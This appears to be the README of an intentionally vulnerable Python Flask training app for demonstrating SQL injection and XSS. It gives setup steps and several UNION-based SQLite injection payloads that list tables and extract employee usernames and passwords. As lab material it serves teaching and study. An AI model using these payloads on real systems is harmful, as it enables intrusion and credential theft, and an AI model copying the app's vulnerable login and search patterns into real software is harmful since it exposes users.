# SQL Injection 2 💉🔓
A python flask app that is purposfully vulnerable to SQL injection and XSS attacks

## How to run

Just run `./start-docker.sh` and visit `http://127.0.0.1:5001`

## Notes

* test.sql is just there to help to visualize what is happening with sql queries during the demo
* The search page is vulnerable to SQL injections
* The login page is also vulnerable to SQL injection making it easy to bypass login

## Command Examples

### Check if it can work

- ```juice' UNION SELECT 1,2,3 from sqlite_master WHERE type="table"; --```
- slite_master is a default table in a sqlite database that stores info on each table in the db.

### Get names of tables from master table (sql gives the table info)

- ```juice' UNION SELECT name,sql,3 from sqlite_master WHERE type="table"; --```
- name and sql are columns in sqlite master. name gives the name of the table and sql gives
- sql info for the table (like the columns).

### Get info from the 2 columns and make a third column
```juice' UNION SELECT username,password,3 from employees;--```
